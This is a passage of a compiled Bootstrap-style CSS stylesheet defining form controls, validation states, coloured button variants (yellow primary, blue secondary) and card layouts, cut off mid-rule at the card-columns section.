  line-height: 1.5; }

.col-form-label-sm {
  padding-top: calc(0.375rem + 2px);
  padding-bottom: calc(0.375rem + 2px);
  font-size: 0.875rem;
  line-height: 1.5; }

.form-control-plaintext {
  display: block;
  width: 100%;
  padding-top: 0.5rem;
  padding-bottom: 0.5rem;
  margin-bottom: 0;
  line-height: 1.5;
  color: #343a40;
  background-color: transparent;
  border: solid transparent;
  border-width: 2px 0; }
  .form-control-plaintext.form-control-sm, .form-control-plaintext.form-control-lg {
    padding-right: 0;
    padding-left: 0; }

.form-control-sm {
  padding: 0.375rem 1rem;
  font-size: 0.875rem;
  line-height: 1.5;
  border-radius: 0.25rem; }

select.form-control-sm:not([size]):not([multiple]) {
  height: calc(2.0625rem + 4px); }

.form-control-lg {
  padding: 0.75rem 1.5rem;
  font-size: 1.25rem;
  line-height: 1.5;
  border-radius: 0.4rem; }

select.form-control-lg:not([size]):not([multiple]) {
  height: calc(3.375rem + 4px); }

.form-group {
  margin-bottom: 1.5rem; }

.form-text {
  display: block;
  margin-top: 0.25rem; }

.form-row {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-wrap: wrap;
      flex-wrap: wrap;
  margin-right: -5px;
  margin-left: -5px; }
  .form-row > .col,
  .form-row > [class*="col-"] {
    padding-right: 5px;
    padding-left: 5px; }

.form-check {
  position: relative;
  display: block;
  padding-left: 1.25rem; }

.form-check-input {
  position: absolute;
  margin-top: 0.3rem;
  margin-left: -1.25rem; }
  .form-check-input:disabled ~ .form-check-label {
    color: #adb5bd; }

.form-check-label {
  margin-bottom: 0; }

.form-check-inline {
  display: -ms-inline-flexbox;
  display: inline-flex;
  -ms-flex-align: center;
      align-items: center;
  padding-left: 0;
  margin-right: 0.75rem; }
  .form-check-inline .form-check-input {
    position: static;
    margin-top: 0;
    margin-right: 0.3125rem;
    margin-left: 0; }

.valid-feedback {
  display: none;
  width: 100%;
  margin-top: 0.25rem;
  font-size: 80%;
  color: #5cc72a; }

.valid-tooltip {
  position: absolute;
  top: 100%;
  z-index: 5;
  display: none;
  max-width: 100%;
  padding: .5rem;
  margin-top: .1rem;
  font-size: .875rem;
  line-height: 1;
  color: #ffffff;
  background-color: rgba(92, 199, 42, 0.8);
  border-radius: .2rem; }

.was-validated .form-control:valid, .form-control.is-valid, .was-validated
.custom-select:valid,
.custom-select.is-valid {
  border-color: #5cc72a; }
  .was-validated .form-control:valid:focus, .form-control.is-valid:focus, .was-validated
  .custom-select:valid:focus,
  .custom-select.is-valid:focus {
    border-color: #5cc72a;
    box-shadow: 0 0 0 0.2rem rgba(92, 199, 42, 0.25); }
  .was-validated .form-control:valid ~ .valid-feedback,
  .was-validated .form-control:valid ~ .valid-tooltip, .form-control.is-valid ~ .valid-feedback,
  .form-control.is-valid ~ .valid-tooltip, .was-validated
  .custom-select:valid ~ .valid-feedback,
  .was-validated
  .custom-select:valid ~ .valid-tooltip,
  .custom-select.is-valid ~ .valid-feedback,
  .custom-select.is-valid ~ .valid-tooltip {
    display: block; }

.was-validated .form-check-input:valid ~ .form-check-label, .form-check-input.is-valid ~ .form-check-label {
  color: #5cc72a; }

.was-validated .form-check-input:valid ~ .valid-feedback,
.was-validated .form-check-input:valid ~ .valid-tooltip, .form-check-input.is-valid ~ .valid-feedback,
.form-check-input.is-valid ~ .valid-tooltip {
  display: block; }

.was-validated .custom-control-input:valid ~ .custom-control-label, .custom-control-input.is-valid ~ .custom-control-label {
  color: #5cc72a; }
  .was-validated .custom-control-input:valid ~ .custom-control-label::before, .custom-control-input.is-valid ~ .custom-control-label::before {
    background-color: #a8e68a; }

.was-validated .custom-control-input:valid ~ .valid-feedback,
.was-validated .custom-control-input:valid ~ .valid-tooltip, .custom-control-input.is-valid ~ .valid-feedback,
.custom-control-input.is-valid ~ .valid-tooltip {
  display: block; }

.was-validated .custom-control-input:valid:checked ~ .custom-control-label::before, .custom-control-input.is-valid:checked ~ .custom-control-label::before {
  background-color: #78d94b; }

.was-validated .custom-control-input:valid:focus ~ .custom-control-label::before, .custom-control-input.is-valid:focus ~ .custom-control-label::before {
  box-shadow: 0 0 0 1px #ffffff, 0 0 0 0.2rem rgba(92, 199, 42, 0.25); }

.was-validated .custom-file-input:valid ~ .custom-file-label, .custom-file-input.is-valid ~ .custom-file-label {
  border-color: #5cc72a; }
  .was-validated .custom-file-input:valid ~ .custom-file-label::before, .custom-file-input.is-valid ~ .custom-file-label::before {
    border-color: inherit; }

.was-validated .custom-file-input:valid ~ .valid-feedback,
.was-validated .custom-file-input:valid ~ .valid-tooltip, .custom-file-input.is-valid ~ .valid-feedback,
.custom-file-input.is-valid ~ .valid-tooltip {
  display: block; }

.was-validated .custom-file-input:valid:focus ~ .custom-file-label, .custom-file-input.is-valid:focus ~ .custom-file-label {
  box-shadow: 0 0 0 0.2rem rgba(92, 199, 42, 0.25); }

.invalid-feedback {
  display: none;
  width: 100%;
  margin-top: 0.25rem;
  font-size: 80%;
  color: #ff1744; }

.invalid-tooltip {
  position: absolute;
  top: 100%;
  z-index: 5;
  display: none;
  max-width: 100%;
  padding: .5rem;
  margin-top: .1rem;
  font-size: .875rem;
  line-height: 1;
  color: #ffffff;
  background-color: rgba(255, 23, 68, 0.8);
  border-radius: .2rem; }

.was-validated .form-control:invalid, .form-control.is-invalid, .was-validated
.custom-select:invalid,
.custom-select.is-invalid {
  border-color: #ff1744; }
  .was-validated .form-control:invalid:focus, .form-control.is-invalid:focus, .was-validated
  .custom-select:invalid:focus,
  .custom-select.is-invalid:focus {
    border-color: #ff1744;
    box-shadow: 0 0 0 0.2rem rgba(255, 23, 68, 0.25); }
  .was-validated .form-control:invalid ~ .invalid-feedback,
  .was-validated .form-control:invalid ~ .invalid-tooltip, .form-control.is-invalid ~ .invalid-feedback,
  .form-control.is-invalid ~ .invalid-tooltip, .was-validated
  .custom-select:invalid ~ .invalid-feedback,
  .was-validated
  .custom-select:invalid ~ .invalid-tooltip,
  .custom-select.is-invalid ~ .invalid-feedback,
  .custom-select.is-invalid ~ .invalid-tooltip {
    display: block; }

.was-validated .form-check-input:invalid ~ .form-check-label, .form-check-input.is-invalid ~ .form-check-label {
  color: #ff1744; }

.was-validated .form-check-input:invalid ~ .invalid-feedback,
.was-validated .form-check-input:invalid ~ .invalid-tooltip, .form-check-input.is-invalid ~ .invalid-feedback,
.form-check-input.is-invalid ~ .invalid-tooltip {
  display: block; }

.was-validated .custom-control-input:invalid ~ .custom-control-label, .custom-control-input.is-invalid ~ .custom-control-label {
  color: #ff1744; }
  .was-validated .custom-control-input:invalid ~ .custom-control-label::before, .custom-control-input.is-invalid ~ .custom-control-label::before {
    background-color: #ff97ab; }

.was-validated .custom-control-input:invalid ~ .invalid-feedback,
.was-validated .custom-control-input:invalid ~ .invalid-tooltip, .custom-control-input.is-invalid ~ .invalid-feedback,
.custom-control-input.is-invalid ~ .invalid-tooltip {
  display: block; }

.was-validated .custom-control-input:invalid:checked ~ .custom-control-label::before, .custom-control-input.is-invalid:checked ~ .custom-control-label::before {
  background-color: #ff4a6d; }

.was-validated .custom-control-input:invalid:focus ~ .custom-control-label::before, .custom-control-input.is-invalid:focus ~ .custom-control-label::before {
  box-shadow: 0 0 0 1px #ffffff, 0 0 0 0.2rem rgba(255, 23, 68, 0.25); }

.was-validated .custom-file-input:invalid ~ .custom-file-label, .custom-file-input.is-invalid ~ .custom-file-label {
  border-color: #ff1744; }
  .was-validated .custom-file-input:invalid ~ .custom-file-label::before, .custom-file-input.is-invalid ~ .custom-file-label::before {
    border-color: inherit; }

.was-validated .custom-file-input:invalid ~ .invalid-feedback,
.was-validated .custom-file-input:invalid ~ .invalid-tooltip, .custom-file-input.is-invalid ~ .invalid-feedback,
.custom-file-input.is-invalid ~ .invalid-tooltip {
  display: block; }

.was-validated .custom-file-input:invalid:focus ~ .custom-file-label, .custom-file-input.is-invalid:focus ~ .custom-file-label {
  box-shadow: 0 0 0 0.2rem rgba(255, 23, 68, 0.25); }

.form-inline {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-flow: row wrap;
      flex-flow: row wrap;
  -ms-flex-align: center;
      align-items: center; }
  .form-inline .form-check {
    width: 100%; }
  @media (min-width: 576px) {
    .form-inline label {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
          align-items: center;
      -ms-flex-pack: center;
          justify-content: center;
      margin-bottom: 0; }
    .form-inline .form-group {
      display: -ms-flexbox;
      display: flex;
      -ms-flex: 0 0 auto;
          flex: 0 0 auto;
      -ms-flex-flow: row wrap;
          flex-flow: row wrap;
      -ms-flex-align: center;
          align-items: center;
      margin-bottom: 0; }
    .form-inline .form-control {
      display: inline-block;
      width: auto;
      vertical-align: middle; }
    .form-inline .form-control-plaintext {
      display: inline-block; }
    .form-inline .input-group,
    .form-inline .custom-select {
      width: auto; }
    .form-inline .form-check {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
          align-items: center;
      -ms-flex-pack: center;
          justify-content: center;
      width: auto;
      padding-left: 0; }
    .form-inline .form-check-input {
      position: relative;
      margin-top: 0;
      margin-right: 0.25rem;
      margin-left: 0; }
    .form-inline .custom-control {
      -ms-flex-align: center;
          align-items: center;
      -ms-flex-pack: center;
          justify-content: center; }
    .form-inline .custom-control-label {
      margin-bottom: 0; } }

.btn {
  display: inline-block;
  font-weight: 700;
  text-align: center;
  white-space: nowrap;
  vertical-align: middle;
  -webkit-user-select: none;
     -moz-user-select: none;
      -ms-user-select: none;
          user-select: none;
  border: 2px solid transparent;
  padding: 0.5rem 1.5rem;
  font-size: 1rem;
  line-height: 1.5;
  border-radius: 0.3rem;
  transition: all 0.2s; }
  @media screen and (prefers-reduced-motion: reduce) {
    .btn {
      transition: none; } }
  .btn:hover, .btn:focus {
    text-decoration: none; }
  .btn:focus, .btn.focus {
    outline: 0;
    box-shadow: none; }
  .btn.disabled, .btn:disabled {
    opacity: 0.65; }
  .btn:not(:disabled):not(.disabled) {
    cursor: pointer; }
  .btn:not(:disabled):not(.disabled):active, .btn:not(:disabled):not(.disabled).active {
    background-image: none; }

a.btn.disabled,
fieldset:disabled a.btn {
  pointer-events: none; }

.btn-primary {
  color: #212529;
  background-color: #ffff00;
  border-color: #ffff00; }
  .btn-primary:hover {
    color: #212529;
    background-color: #d9d900;
    border-color: #cccc00; }
  .btn-primary:focus, .btn-primary.focus {
    box-shadow: 0 0 0 0.2rem rgba(255, 255, 0, 0.5); }
  .btn-primary.disabled, .btn-primary:disabled {
    color: #212529;
    background-color: #ffff00;
    border-color: #ffff00; }
  .btn-primary:not(:disabled):not(.disabled):active, .btn-primary:not(:disabled):not(.disabled).active,
  .show > .btn-primary.dropdown-toggle {
    color: #212529;
    background-color: #cccc00;
    border-color: #bfbf00; }
    .btn-primary:not(:disabled):not(.disabled):active:focus, .btn-primary:not(:disabled):not(.disabled).active:focus,
    .show > .btn-primary.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(255, 255, 0, 0.5); }

.btn-secondary {
  color: #ffffff;
  background-color: #0000ff;
  border-color: #0000ff; }
  .btn-secondary:hover {
    color: #ffffff;
    background-color: #0000d9;
    border-color: #0000cc; }
  .btn-secondary:focus, .btn-secondary.focus {
    box-shadow: 0 0 0 0.2rem rgba(0, 0, 255, 0.5); }
  .btn-secondary.disabled, .btn-secondary:disabled {
    color: #ffffff;
    background-color: #0000ff;
    border-color: #0000ff; }
  .btn-secondary:not(:disabled):not(.disabled):active, .btn-secondary:not(:disabled):not(.disabled).active,
  .show > .btn-secondary.dropdown-toggle {
    color: #ffffff;
    background-color: #0000cc;
    border-color: #0000bf; }
    .btn-secondary:not(:disabled):not(.disabled):active:focus, .btn-secondary:not(:disabled):not(.disabled).active:focus,
    .show > .btn-secondary.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(0, 0, 255, 0.5); }

.btn-success {
  color: #ffffff;
  background-color: #5cc72a;
  border-color: #5cc72a; }
  .btn-success:hover {
    color: #ffffff;
    background-color: #4da723;
    border-color: #499d21; }
  .btn-success:focus, .btn-success.focus {
    box-shadow: 0 0 0 0.2rem rgba(92, 199, 42, 0.5); }
  .btn-success.disabled, .btn-success:disabled {
    color: #ffffff;
    background-color: #5cc72a;
    border-color: #5cc72a; }
  .btn-success:not(:disabled):not(.disabled):active, .btn-success:not(:disabled):not(.disabled).active,
  .show > .btn-success.dropdown-toggle {
    color: #ffffff;
    background-color: #499d21;
    border-color: #44921f; }
    .btn-success:not(:disabled):not(.disabled):active:focus, .btn-success:not(:disabled):not(.disabled).active:focus,
    .show > .btn-success.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(92, 199, 42, 0.5); }

.btn-info {
  color: #212529;
  background-color: #00e5ff;
  border-color: #00e5ff; }
  .btn-info:hover {
    color: #ffffff;
    background-color: #00c3d9;
    border-color: #00b7cc; }
  .btn-info:focus, .btn-info.focus {
    box-shadow: 0 0 0 0.2rem rgba(0, 229, 255, 0.5); }
  .btn-info.disabled, .btn-info:disabled {
    color: #212529;
    background-color: #00e5ff;
    border-color: #00e5ff; }
  .btn-info:not(:disabled):not(.disabled):active, .btn-info:not(:disabled):not(.disabled).active,
  .show > .btn-info.dropdown-toggle {
    color: #ffffff;
    background-color: #00b7cc;
    border-color: #00acbf; }
    .btn-info:not(:disabled):not(.disabled):active:focus, .btn-info:not(:disabled):not(.disabled).active:focus,
    .show > .btn-info.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(0, 229, 255, 0.5); }

.btn-warning {
  color: #212529;
  background-color: #f6c343;
  border-color: #f6c343; }
  .btn-warning:hover {
    color: #212529;
    background-color: #f4b71e;
    border-color: #f4b312; }
  .btn-warning:focus, .btn-warning.focus {
    box-shadow: 0 0 0 0.2rem rgba(246, 195, 67, 0.5); }
  .btn-warning.disabled, .btn-warning:disabled {
    color: #212529;
    background-color: #f6c343;
    border-color: #f6c343; }
  .btn-warning:not(:disabled):not(.disabled):active, .btn-warning:not(:disabled):not(.disabled).active,
  .show > .btn-warning.dropdown-toggle {
    color: #212529;
    background-color: #f4b312;
    border-color: #eead0b; }
    .btn-warning:not(:disabled):not(.disabled):active:focus, .btn-warning:not(:disabled):not(.disabled).active:focus,
    .show > .btn-warning.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(246, 195, 67, 0.5); }

.btn-danger {
  color: #ffffff;
  background-color: #ff1744;
  border-color: #ff1744; }
  .btn-danger:hover {
    color: #ffffff;
    background-color: #f0002f;
    border-color: #e3002c; }
  .btn-danger:focus, .btn-danger.focus {
    box-shadow: 0 0 0 0.2rem rgba(255, 23, 68, 0.5); }
  .btn-danger.disabled, .btn-danger:disabled {
    color: #ffffff;
    background-color: #ff1744;
    border-color: #ff1744; }
  .btn-danger:not(:disabled):not(.disabled):active, .btn-danger:not(:disabled):not(.disabled).active,
  .show > .btn-danger.dropdown-toggle {
    color: #ffffff;
    background-color: #e3002c;
    border-color: #d6002a; }
    .btn-danger:not(:disabled):not(.disabled):active:focus, .btn-danger:not(:disabled):not(.disabled).active:focus,
    .show > .btn-danger.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(255, 23, 68, 0.5); }

.btn-light {
  color: #212529;
  background-color: #f8f9fa;
  border-color: #f8f9fa; }
  .btn-light:hover {
    color: #212529;
    background-color: #e2e6ea;
    border-color: #dae0e5; }
  .btn-light:focus, .btn-light.focus {
    box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5); }
  .btn-light.disabled, .btn-light:disabled {
    color: #212529;
    background-color: #f8f9fa;
    border-color: #f8f9fa; }
  .btn-light:not(:disabled):not(.disabled):active, .btn-light:not(:disabled):not(.disabled).active,
  .show > .btn-light.dropdown-toggle {
    color: #212529;
    background-color: #dae0e5;
    border-color: #d3d9df; }
    .btn-light:not(:disabled):not(.disabled):active:focus, .btn-light:not(:disabled):not(.disabled).active:focus,
    .show > .btn-light.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5); }

.btn-dark {
  color: #ffffff;
  background-color: black;
  border-color: black; }
  .btn-dark:hover {
    color: #ffffff;
    background-color: black;
    border-color: black; }
  .btn-dark:focus, .btn-dark.focus {
    box-shadow: 0 0 0 0.2rem rgba(0, 0, 0, 0.5); }
  .btn-dark.disabled, .btn-dark:disabled {
    color: #ffffff;
    background-color: black;
    border-color: black; }
  .btn-dark:not(:disabled):not(.disabled):active, .btn-dark:not(:disabled):not(.disabled).active,
  .show > .btn-dark.dropdown-toggle {
    color: #ffffff;
    background-color: black;
    border-color: black; }
    .btn-dark:not(:disabled):not(.disabled):active:focus, .btn-dark:not(:disabled):not(.disabled).active:focus,
    .show > .btn-dark.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(0, 0, 0, 0.5); }

.btn-outline-primary {
  color: #ffff00;
  background-color: transparent;
  background-image: none;
  border-color: #ffff00; }
  .btn-outline-primary:hover {
    color: #212529;
    background-color: #ffff00;
    border-color: #ffff00; }
  .btn-outline-primary:focus, .btn-outline-primary.focus {
    box-shadow: 0 0 0 0.2rem rgba(255, 255, 0, 0.5); }
  .btn-outline-primary.disabled, .btn-outline-primary:disabled {
    color: #ffff00;
    background-color: transparent; }
  .btn-outline-primary:not(:disabled):not(.disabled):active, .btn-outline-primary:not(:disabled):not(.disabled).active,
  .show > .btn-outline-primary.dropdown-toggle {
    color: #212529;
    background-color: #ffff00;
    border-color: #ffff00; }
    .btn-outline-primary:not(:disabled):not(.disabled):active:focus, .btn-outline-primary:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-primary.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(255, 255, 0, 0.5); }

.btn-outline-secondary {
  color: #0000ff;
  background-color: transparent;
  background-image: none;
  border-color: #0000ff; }
  .btn-outline-secondary:hover {
    color: #ffffff;
    background-color: #0000ff;
    border-color: #0000ff; }
  .btn-outline-secondary:focus, .btn-outline-secondary.focus {
    box-shadow: 0 0 0 0.2rem rgba(0, 0, 255, 0.5); }
  .btn-outline-secondary.disabled, .btn-outline-secondary:disabled {
    color: #0000ff;
    background-color: transparent; }
  .btn-outline-secondary:not(:disabled):not(.disabled):active, .btn-outline-secondary:not(:disabled):not(.disabled).active,
  .show > .btn-outline-secondary.dropdown-toggle {
    color: #ffffff;
    background-color: #0000ff;
    border-color: #0000ff; }
    .btn-outline-secondary:not(:disabled):not(.disabled):active:focus, .btn-outline-secondary:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-secondary.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(0, 0, 255, 0.5); }

.btn-outline-success {
  color: #5cc72a;
  background-color: transparent;
  background-image: none;
  border-color: #5cc72a; }
  .btn-outline-success:hover {
    color: #ffffff;
    background-color: #5cc72a;
    border-color: #5cc72a; }
  .btn-outline-success:focus, .btn-outline-success.focus {
    box-shadow: 0 0 0 0.2rem rgba(92, 199, 42, 0.5); }
  .btn-outline-success.disabled, .btn-outline-success:disabled {
    color: #5cc72a;
    background-color: transparent; }
  .btn-outline-success:not(:disabled):not(.disabled):active, .btn-outline-success:not(:disabled):not(.disabled).active,
  .show > .btn-outline-success.dropdown-toggle {
    color: #ffffff;
    background-color: #5cc72a;
    border-color: #5cc72a; }
    .btn-outline-success:not(:disabled):not(.disabled):active:focus, .btn-outline-success:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-success.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(92, 199, 42, 0.5); }

.btn-outline-info {
  color: #00e5ff;
  background-color: transparent;
  background-image: none;
  border-color: #00e5ff; }
  .btn-outline-info:hover {
    color: #212529;
    background-color: #00e5ff;
    border-color: #00e5ff; }
  .btn-outline-info:focus, .btn-outline-info.focus {
    box-shadow: 0 0 0 0.2rem rgba(0, 229, 255, 0.5); }
  .btn-outline-info.disabled, .btn-outline-info:disabled {
    color: #00e5ff;
    background-color: transparent; }
  .btn-outline-info:not(:disabled):not(.disabled):active, .btn-outline-info:not(:disabled):not(.disabled).active,
  .show > .btn-outline-info.dropdown-toggle {
    color: #212529;
    background-color: #00e5ff;
    border-color: #00e5ff; }
    .btn-outline-info:not(:disabled):not(.disabled):active:focus, .btn-outline-info:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-info.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(0, 229, 255, 0.5); }

.btn-outline-warning {
  color: #f6c343;
  background-color: transparent;
  background-image: none;
  border-color: #f6c343; }
  .btn-outline-warning:hover {
    color: #212529;
    background-color: #f6c343;
    border-color: #f6c343; }
  .btn-outline-warning:focus, .btn-outline-warning.focus {
    box-shadow: 0 0 0 0.2rem rgba(246, 195, 67, 0.5); }
  .btn-outline-warning.disabled, .btn-outline-warning:disabled {
    color: #f6c343;
    background-color: transparent; }
  .btn-outline-warning:not(:disabled):not(.disabled):active, .btn-outline-warning:not(:disabled):not(.disabled).active,
  .show > .btn-outline-warning.dropdown-toggle {
    color: #212529;
    background-color: #f6c343;
    border-color: #f6c343; }
    .btn-outline-warning:not(:disabled):not(.disabled):active:focus, .btn-outline-warning:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-warning.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(246, 195, 67, 0.5); }

.btn-outline-danger {
  color: #ff1744;
  background-color: transparent;
  background-image: none;
  border-color: #ff1744; }
  .btn-outline-danger:hover {
    color: #ffffff;
    background-color: #ff1744;
    border-color: #ff1744; }
  .btn-outline-danger:focus, .btn-outline-danger.focus {
    box-shadow: 0 0 0 0.2rem rgba(255, 23, 68, 0.5); }
  .btn-outline-danger.disabled, .btn-outline-danger:disabled {
    color: #ff1744;
    background-color: transparent; }
  .btn-outline-danger:not(:disabled):not(.disabled):active, .btn-outline-danger:not(:disabled):not(.disabled).active,
  .show > .btn-outline-danger.dropdown-toggle {
    color: #ffffff;
    background-color: #ff1744;
    border-color: #ff1744; }
    .btn-outline-danger:not(:disabled):not(.disabled):active:focus, .btn-outline-danger:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-danger.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(255, 23, 68, 0.5); }

.btn-outline-light {
  color: #f8f9fa;
  background-color: transparent;
  background-image: none;
  border-color: #f8f9fa; }
  .btn-outline-light:hover {
    color: #212529;
    background-color: #f8f9fa;
    border-color: #f8f9fa; }
  .btn-outline-light:focus, .btn-outline-light.focus {
    box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5); }
  .btn-outline-light.disabled, .btn-outline-light:disabled {
    color: #f8f9fa;
    background-color: transparent; }
  .btn-outline-light:not(:disabled):not(.disabled):active, .btn-outline-light:not(:disabled):not(.disabled).active,
  .show > .btn-outline-light.dropdown-toggle {
    color: #212529;
    background-color: #f8f9fa;
    border-color: #f8f9fa; }
    .btn-outline-light:not(:disabled):not(.disabled):active:focus, .btn-outline-light:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-light.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5); }

.btn-outline-dark {
  color: black;
  background-color: transparent;
  background-image: none;
  border-color: black; }
  .btn-outline-dark:hover {
    color: #ffffff;
    background-color: black;
    border-color: black; }
  .btn-outline-dark:focus, .btn-outline-dark.focus {
    box-shadow: 0 0 0 0.2rem rgba(0, 0, 0, 0.5); }
  .btn-outline-dark.disabled, .btn-outline-dark:disabled {
    color: black;
    background-color: transparent; }
  .btn-outline-dark:not(:disabled):not(.disabled):active, .btn-outline-dark:not(:disabled):not(.disabled).active,
  .show > .btn-outline-dark.dropdown-toggle {
    color: #ffffff;
    background-color: black;
    border-color: black; }
    .btn-outline-dark:not(:disabled):not(.disabled):active:focus, .btn-outline-dark:not(:disabled):not(.disabled).active:focus,
    .show > .btn-outline-dark.dropdown-toggle:focus {
      box-shadow: 0 0 0 0.2rem rgba(0, 0, 0, 0.5); }

.btn-link {
  font-weight: 400;
  color: #000000;
  background-color: transparent; }
  .btn-link:hover {
    color: #666666;
    text-decoration: none;
    background-color: transparent;
    border-color: transparent; }
  .btn-link:focus, .btn-link.focus {
    text-decoration: none;
    border-color: transparent;
    box-shadow: none; }
  .btn-link:disabled, .btn-link.disabled {
    color: #868e96;
    pointer-events: none; }

.btn-lg {
  padding: 0.75rem 1.5rem;
  font-size: 1.25rem;
  line-height: 1.5;
  border-radius: 0.4rem; }

.btn-sm {
  padding: 0.375rem 1rem;
  font-size: 0.875rem;
  line-height: 1.5;
  border-radius: 0.25rem; }

.btn-block {
  display: block;
  width: 100%; }
  .btn-block + .btn-block {
    margin-top: 0.5rem; }

input[type="submit"].btn-block,
input[type="reset"].btn-block,
input[type="button"].btn-block {
  width: 100%; }

.fade {
  transition: opacity 0.15s linear; }
  @media screen and (prefers-reduced-motion: reduce) {
    .fade {
      transition: none; } }
  .fade:not(.show) {
    opacity: 0; }

.collapse:not(.show) {
  display: none; }

.collapsing {
  position: relative;
  height: 0;
  overflow: hidden;
  transition: height 0.35s ease; }
  @media screen and (prefers-reduced-motion: reduce) {
    .collapsing {
      transition: none; } }

.card {
  position: relative;
  display: -ms-flexbox;
  display: flex;
  -ms-flex-direction: column;
      flex-direction: column;
  min-width: 0;
  word-wrap: break-word;
  background-color: #ffffff;
  background-clip: border-box;
  border: 0.25rem solid #f8f9fa;
  border-radius: 0.3rem; }
  .card > hr {
    margin-right: 0;
    margin-left: 0; }
  .card > .list-group:first-child .list-group-item:first-child {
    border-top-left-radius: 0.3rem;
    border-top-right-radius: 0.3rem; }
  .card > .list-group:last-child .list-group-item:last-child {
    border-bottom-right-radius: 0.3rem;
    border-bottom-left-radius: 0.3rem; }

.card-body {
  -ms-flex: 1 1 auto;
      flex: 1 1 auto;
  padding: 1.25rem; }

.card-title {
  margin-bottom: 0.75rem; }

.card-subtitle {
  margin-top: -0.375rem;
  margin-bottom: 0; }

.card-text:last-child {
  margin-bottom: 0; }

.card-link:hover {
  text-decoration: none; }

.card-link + .card-link {
  margin-left: 1.25rem; }

.card-header {
  padding: 0.75rem 1.25rem;
  margin-bottom: 0;
  background-color: rgba(0, 0, 0, 0.03);
  border-bottom: 0.25rem solid #f8f9fa; }
  .card-header:first-child {
    border-radius: calc(0.3rem - 0.25rem) calc(0.3rem - 0.25rem) 0 0; }
  .card-header + .list-group .list-group-item:first-child {
    border-top: 0; }

.card-footer {
  padding: 0.75rem 1.25rem;
  background-color: rgba(0, 0, 0, 0.03);
  border-top: 0.25rem solid #f8f9fa; }
  .card-footer:last-child {
    border-radius: 0 0 calc(0.3rem - 0.25rem) calc(0.3rem - 0.25rem); }

.card-header-tabs {
  margin-right: -0.625rem;
  margin-bottom: -0.75rem;
  margin-left: -0.625rem;
  border-bottom: 0; }

.card-header-pills {
  margin-right: -0.625rem;
  margin-left: -0.625rem; }

.card-img-overlay {
  position: absolute;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  padding: 1.25rem; }

.card-img {
  width: 100%;
  border-radius: calc(0.3rem - 0.25rem); }

.card-img-top {
  width: 100%;
  border-top-left-radius: calc(0.3rem - 0.25rem);
  border-top-right-radius: calc(0.3rem - 0.25rem); }

.card-img-bottom {
  width: 100%;
  border-bottom-right-radius: calc(0.3rem - 0.25rem);
  border-bottom-left-radius: calc(0.3rem - 0.25rem); }

.card-deck {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-direction: column;
      flex-direction: column; }
  .card-deck .card {
    margin-bottom: 15px; }
  @media (min-width: 576px) {
    .card-deck {
      -ms-flex-flow: row wrap;
          flex-flow: row wrap;
      margin-right: -15px;
      margin-left: -15px; }
      .card-deck .card {
        display: -ms-flexbox;
        display: flex;
        -ms-flex: 1 0 0%;
            flex: 1 0 0%;
        -ms-flex-direction: column;
            flex-direction: column;
        margin-right: 15px;
        margin-bottom: 0;
        margin-left: 15px; } }

.card-group {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-direction: column;
      flex-direction: column; }
  .card-group > .card {
    margin-bottom: 15px; }
  @media (min-width: 576px) {
    .card-group {
      -ms-flex-flow: row wrap;
          flex-flow: row wrap; }
      .card-group > .card {
        -ms-flex: 1 0 0%;
            flex: 1 0 0%;
        margin-bottom: 0; }
        .card-group > .card + .card {
          margin-left: 0;
          border-left: 0; }
        .card-group > .card:first-child {
          border-top-right-radius: 0;
          border-bottom-right-radius: 0; }
          .card-group > .card:first-child .card-img-top,
          .card-group > .card:first-child .card-header {
            border-top-right-radius: 0; }
          .card-group > .card:first-child .card-img-bottom,
          .card-group > .card:first-child .card-footer {
            border-bottom-right-radius: 0; }
        .card-group > .card:last-child {
          border-top-left-radius: 0;
          border-bottom-left-radius: 0; }
          .card-group > .card:last-child .card-img-top,
          .card-group > .card:last-child .card-header {
            border-top-left-radius: 0; }
          .card-group > .card:last-child .card-img-bottom,
          .card-group > .card:last-child .card-footer {
            border-bottom-left-radius: 0; }
        .card-group > .card:only-child {
          border-radius: 0.3rem; }
          .card-group > .card:only-child .card-img-top,
          .card-group > .card:only-child .card-header {
            border-top-left-radius: 0.3rem;
            border-top-right-radius: 0.3rem; }
          .card-group > .card:only-child .card-img-bottom,
          .card-group > .card:only-child .card-footer {
            border-bottom-right-radius: 0.3rem;
            border-bottom-left-radius: 0.3rem; }
        .card-group > .card:not(:first-child):not(:last-child):not(:only-child) {
          border-radius: 0; }
          .card-group > .card:not(:first-child):not(:last-child):not(:only-child) .card-img-top,
          .card-group > .card:not(:first-child):not(:last-child):not(:only-child) .card-img-bottom,
          .card-group > .card:not(:first-child):not(:last-child):not(:only-child) .card-header,
          .card-group > .card:not(:first-child):not(:last-child):not(:only-child) .card-footer {
            border-radius: 0; } }

.card-columns .card {
